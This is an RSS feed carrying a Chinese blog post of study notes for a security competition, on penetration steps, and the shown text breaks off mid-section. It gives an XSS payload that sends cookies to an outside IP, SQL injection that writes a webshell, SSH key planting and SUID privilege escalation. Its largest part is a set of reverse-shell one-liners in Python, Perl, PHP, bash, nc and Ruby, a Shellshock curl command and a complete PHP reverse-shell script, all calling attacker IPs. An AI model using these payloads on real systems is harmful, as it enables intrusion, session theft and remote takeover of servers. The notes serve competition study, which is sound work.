<?xml version="1.0"?>
<rss version="2.0">
    <channel>
        <title>dpm12345 • Posts by &#34;信息安全&#34; tag</title>
        <link>http://dpm12345.cn</link>
        <description>学习记录</description>
        <language>zh-CN</language>
        <pubDate>Wed, 31 Aug 2022 14:16:37 +0800</pubDate>
        <lastBuildDate>Wed, 31 Aug 2022 14:16:37 +0800</lastBuildDate>
        <category>Qt</category>
        <category>ms17</category>
        <category>msf</category>
        <category>git</category>
        <category>CTF</category>
        <category>sql注入</category>
        <category>笔记</category>
        <category>SSRF</category>
        <category>kali</category>
        <category>nmap</category>
        <category>Misc</category>
        <category>MFC</category>
        <category>cryptography</category>
        <category>ctfshow</category>
        <category>Web</category>
        <category>树</category>
        <category>二叉树</category>
        <category>数据结构</category>
        <category>hexo</category>
        <category>队列</category>
        <category>前缀和</category>
        <category>动态规划</category>
        <category>滑动窗口</category>
        <category>数组</category>
        <category>哈希表</category>
        <category>链表</category>
        <category>矩阵</category>
        <category>递归</category>
        <category>贪心</category>
        <category>子序列</category>
        <category>最长公共子序列</category>
        <category>最长回文子序列</category>
        <category>字符串</category>
        <category>括号</category>
        <category>vector</category>
        <category>栈</category>
        <category>双指针（快慢指针）</category>
        <category>排列组合</category>
        <category>等差数列</category>
        <category>深度优先搜索</category>
        <category>广度优先搜索</category>
        <category>ciscn</category>
        <category>SSTI</category>
        <category>arm-linux</category>
        <category>Tiny6410</category>
        <category>信息安全</category>
        <category>linux</category>
        <category>web</category>
        <category>javascript</category>
        <category>XXE</category>
        <item>
            <guid isPermalink="true">http://dpm12345.cn/posts/5463b311/</guid>
            <title>信息安全铁人三项学习</title>
            <link>http://dpm12345.cn/posts/5463b311/</link>
            <category>信息安全</category>
            <pubDate>Wed, 31 Aug 2022 14:16:37 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;&lt;img data-src=&#34;../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/target.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/%E5%A4%A7%E7%BA%B2_1.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/%E5%A4%A7%E7%BA%B2_2.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/%E5%A4%A7%E7%BA%B2_3.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/%E5%A4%A7%E7%BA%B2_4.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/%E5%A4%A7%E7%BA%B2_5.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/%E5%A4%A7%E7%BA%B2_6.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/%E5%A4%A7%E7%BA%B2_7.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/%E5%A4%A7%E7%BA%B2_8.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/%E5%A4%A7%E7%BA%B2_9.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/%E5%A4%A7%E7%BA%B2_10.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/%E5%A4%A7%E7%BA%B2_11.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/%E5%A4%A7%E7%BA%B2_12.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/%E5%A4%A7%E7%BA%B2_13.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/%E5%A4%A7%E7%BA%B2_14.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/%E5%A4%A7%E7%BA%B2_15.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;nessus&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;/bin/systemctl start nessusd.service&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h1 id=&#34;提权分类&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#提权分类&#34;&gt;#&lt;/a&gt; 提权分类&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;数据库提权：udf 提权、mof 提权、反弹端口链接提权等&lt;/li&gt;
&lt;li&gt;web 提权：SQL 注入提权、webshell 提权、web 中间件提权等&lt;/li&gt;
&lt;li&gt;操作系统提权：系统内核溢出提权、错误的系统配置提权、组策略首选项提权、DLL 劫持提权、第三方软件提权&lt;/li&gt;
&lt;li&gt;安卓提权等&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;23-综合渗透之-suid-提权&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#23-综合渗透之-suid-提权&#34;&gt;#&lt;/a&gt; 2.3 综合渗透之 SUID 提权&lt;/h1&gt;
&lt;h2 id=&#34;xss-绕过-csp-获取登陆-cookie&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#xss-绕过-csp-获取登陆-cookie&#34;&gt;#&lt;/a&gt; XSS 绕过 CSP 获取登陆 cookie&lt;/h2&gt;
&lt;p&gt;CSP 是由单词 Content Security Policy 的首单词组成，CSP 旨在减少 (注意这里是减少而不是消灭) 跨站脚本攻击。&lt;/p&gt;
&lt;p&gt;找到 XSS 注入点，输入&lt;/p&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;figcaption data-lang=&#34;HTML&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;script&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token script&#34;&gt;&lt;span class=&#34;token language-javascript&#34;&gt;window&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;location&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;href&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;http://ip/任意文件名?=&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;document&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;cookie&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;script&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;由此可以获得 cookie 值&lt;/p&gt;
&lt;p&gt;之后转到登陆界面，输入 cookie 值，来到管理员界面（可能为 /admin 目录）&lt;/p&gt;
&lt;h2 id=&#34;利用-sql-注入写一句话木马&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#利用-sql-注入写一句话木马&#34;&gt;#&lt;/a&gt; 利用 sql 注入写一句话木马&lt;/h2&gt;
&lt;p&gt;在界面中，观察 url 的形式，找到注入点&lt;/p&gt;
&lt;p&gt;输入  &lt;code&gt;union select 1,2,3&lt;/code&gt;  先确认输出位置点&lt;/p&gt;
&lt;p&gt;再根据 sql 命令 &lt;code&gt;and select 1,select 0x[一句话木马的hex编码],3 into outfile &#34;/var/www/html/1.php&#34;&lt;/code&gt;  写入一句话木马&lt;/p&gt;
&lt;p&gt;(若无法写入，可尝试更换目录)&lt;/p&gt;
&lt;p&gt;写入后，访问观察是否成功，之后使用蚁剑连接，使用提供的终端 &lt;code&gt;whoami&lt;/code&gt;  获取用户&lt;/p&gt;
&lt;h2 id=&#34;利用-ssh-来获得低权限&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#利用-ssh-来获得低权限&#34;&gt;#&lt;/a&gt; 利用 ssh 来获得低权限&lt;/h2&gt;
&lt;p&gt;使用 &lt;code&gt;ssh-keygen -t rsa&lt;/code&gt;  在本地生成一个 &lt;code&gt;id_rsa.pub&lt;/code&gt; , 之后将该文件复制，更名为 &lt;code&gt;authorized_keys&lt;/code&gt; , 利用菜刀工具上传到目标机服务器上的 &lt;code&gt;.ssh&lt;/code&gt;  文件夹中，然后本地 &lt;code&gt;ssh用户名@ip&lt;/code&gt;  登陆低权限用户&lt;/p&gt;
&lt;h2 id=&#34;利用-suid-获取高权限&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#利用-suid-获取高权限&#34;&gt;#&lt;/a&gt; 利用 SUID 获取高权限&lt;/h2&gt;
&lt;p&gt;如果设置了 SUID 这个标志位，普通权限的程序在执行的时候，可以暂时拥有 root 权限、&lt;/p&gt;
&lt;p&gt;已知的可以用来提权的 Linux 可执行文件有:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Nmap&lt;/li&gt;
&lt;li&gt;Vim&lt;/li&gt;
&lt;li&gt;find&lt;/li&gt;
&lt;li&gt;Bash&lt;/li&gt;
&lt;li&gt;More&lt;/li&gt;
&lt;li&gt;Less&lt;/li&gt;
&lt;li&gt;Nano&lt;/li&gt;
&lt;li&gt;cp&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;下面的命令可以发现所有的系统中运行的 SUID 可执行文件&lt;/p&gt;
&lt;p&gt;&lt;code&gt;find / -user root -perm -4000 -print 2&amp;gt;/dev/null&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;find / -user root -perm -4000-exec ls -ldb {} ;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;find / -perm -u=s -type f 2&amp;gt;/dev/null&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;执行以下命令，可以看到，当前的权限是 root&lt;/p&gt;
&lt;p&gt;&lt;code&gt;/usr/bin/find test -exec whoami \;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;其他可见 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ndGZvYmlucy5naXRodWIuaW8=&#34;&gt;https://gtfobins.github.io&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;通过其，可以修改配置文件&lt;/p&gt;
&lt;h2 id=&#34;反弹-shell&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#反弹-shell&#34;&gt;#&lt;/a&gt; 反弹 shell&lt;/h2&gt;
&lt;p&gt;python&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;python &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;c &lt;span class=&#34;token string&#34;&gt;&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.10.14.1&#34;,4443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;perl&lt;/p&gt;
&lt;figure class=&#34;highlight perl&#34;&gt;&lt;figcaption data-lang=&#34;perl&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;perl &lt;span class=&#34;token operator&#34;&gt;-e&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;use Socket;$i=&#34;10.10.14.23&#34;;$p=4443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#34;tcp&#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&#34;&amp;gt;&amp;amp;S&#34;);open(STDOUT,&#34;&amp;gt;&amp;amp;S&#34;);open(STDERR,&#34;&amp;gt;&amp;amp;S&#34;);exec(&#34;/bin/sh -i&#34;);};&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;php&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;nc -e /bin/bash 10.10.14.6 4444&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token delimiter important&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;  //html版 &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;exec&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;/bin/bash -c &#39;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.2/4444 0&amp;gt;&amp;amp;1&#39;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token delimiter important&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;    &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;php -r &#39;$sock=fsockopen(&#34;10.0.0.1&#34;,1234);exec(&#34;/bin/sh -i &lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;&amp;amp;3&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&amp;amp;3 2&amp;gt;&amp;amp;3&#34;);&#39;    //内置语言版&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;html 无 nc 版&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-php+HTML&#34;&gt;
&amp;lt;?php 
set_time_limit(0);
$VERSION = &#34;1.0&#34;;
$ip = &#34;10.10.14.6&#34;;
$port = 4444;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = &#34;uname -a; w; id; /bin/bash -i&#34;;
$daemon = 0;
$debug = 0;
if (function_exists(&#34;pcntl_fork&#34;)) {
    $pid = pcntl_fork();
    if ($pid == -1) {
        printit(&#34;ERROR: Cannot fork&#34;);
        exit(1);
    }
    if ($pid) {
        exit(0);
    }
    if (posix_setsid() == -1) {
        printit(&#34;Error: Cannot setsid()&#34;);
        exit(1);
    }
    $daemon = 1;
} else {
    printit(&#34;WARNING: Failed to daemonise.  This is quite common and not fatal.&#34;);
}
chdir(&#34;/&#34;);
umask(0);
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
    printit(&#34;$errstr ($errno)&#34;);
    exit(1);
}
$descriptorspec = array(0 =&amp;gt; array(&#34;pipe&#34;, &#34;r&#34;), 1 =&amp;gt; array(&#34;pipe&#34;, &#34;w&#34;), 2 =&amp;gt; array(&#34;pipe&#34;, &#34;w&#34;));
$process = proc_open($shell, $descriptorspec, $pipes);
if (!is_resource($process)) {
    printit(&#34;ERROR: Cannot spawn shell&#34;);
    exit(1);
}
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);
printit(&#34;Successfully opened reverse shell to $ip:$port&#34;);
while (1) {
    if (feof($sock)) {
        printit(&#34;ERROR: Shell connection terminated&#34;);
        break;
    }
    if (feof($pipes[1])) {
        printit(&#34;ERROR: Shell process terminated&#34;);
        break;
    }
    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
    if (in_array($sock, $read_a)) {
        if ($debug) printit(&#34;SOCK READ&#34;);
        $input = fread($sock, $chunk_size);
        if ($debug) printit(&#34;SOCK: $input&#34;);
        fwrite($pipes[0], $input);
    }
    if (in_array($pipes[1], $read_a)) {
        if ($debug) printit(&#34;STDOUT READ&#34;);
        $input = fread($pipes[1], $chunk_size);
        if ($debug) printit(&#34;STDOUT: $input&#34;);
        fwrite($sock, $input);
    }
    if (in_array($pipes[2], $read_a)) {
        if ($debug) printit(&#34;STDERR READ&#34;);
        $input = fread($pipes[2], $chunk_size);
        if ($debug) printit(&#34;STDERR: $input&#34;);
        fwrite($sock, $input);
    }
}
fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);
function printit($string)
{
    if (!$daemon) {
        print &#34;$string\n&#34;;
    }
} ?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;curl&lt;/p&gt;
&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;figcaption data-lang=&#34;PowerShell&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;curl &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;H &lt;span class=&#34;token string&#34;&gt;&#39;Cookie: () { :;}; /bin/bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.23/4443 0&amp;gt;&amp;amp;1&#39;&lt;/span&gt; http:&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;10&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;10&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;10&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;56/cgi-bin/user&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sh`&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;bash&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;/bash &lt;span class=&#34;token parameter variable&#34;&gt;-i&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;&amp;gt;&amp;amp;&lt;/span&gt; /dev/tcp/10.10.14.23/4444 &lt;span class=&#34;token operator&#34;&gt;&lt;span class=&#34;token file-descriptor important&#34;&gt;0&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;token file-descriptor important&#34;&gt;&amp;amp;1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;nc&lt;/p&gt;
&lt;figure class=&#34;highlight raw&#34;&gt;&lt;figcaption data-lang=&#34;&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;nc -e /bin/sh 10.0.0.1 1234&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;// 若是机器上安装的 nc 版本没有 - e 选项&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.0.0.1 1234 &amp;gt;/tmp/f&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;Ruby&lt;/p&gt;
&lt;figure class=&#34;highlight ruby&#34;&gt;&lt;figcaption data-lang=&#34;ruby&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;依赖&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;bin&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;sh&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;ruby &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;rsocket &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;e&lt;span class=&#34;token string-literal&#34;&gt;&lt;span class=&#34;token string&#34;&gt;&#39;f=TCPSocket.open(&#34;10.0.0.1&#34;,1234).to_i;exec sprintf(&#34;/bin/sh -i &amp;lt;&amp;amp;%d &amp;gt;&amp;amp;%d 2&amp;gt;&amp;amp;%d&#34;,f,f,f)&#39;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;不依赖：&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;ruby &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;rsocket &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;e &lt;span class=&#34;token string-literal&#34;&gt;&lt;span class=&#34;token string&#34;&gt;&#39;exit if fork;c=TCPSocket.new(&#34;attackerip&#34;,&#34;4444&#34;);while(cmd=c.gets);IO.popen(cmd,&#34;r&#34;){|io|c.print io.read}end&#39;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;sh 文件&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token builtin class-name&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-e&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;#!/bin/bash\n\nbash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.2/4445 0&amp;gt;&amp;amp;1&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt; xxx.sh&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;bash&lt;/span&gt; xxx.sh&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;二、调取 shell 的各种方式&lt;/p&gt;
&lt;p&gt;perl&lt;/p&gt;
&lt;figure class=&#34;highlight perl&#34;&gt;&lt;figcaption data-lang=&#34;perl&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;usr&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;bin&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;perl &lt;span class=&#34;token operator&#34;&gt;-e&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;use POSIX (setuid); POSIX::setuid(0); exec &#34;/bin/bash&#34;;&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;python （获取交互式 shell）&lt;/p&gt;
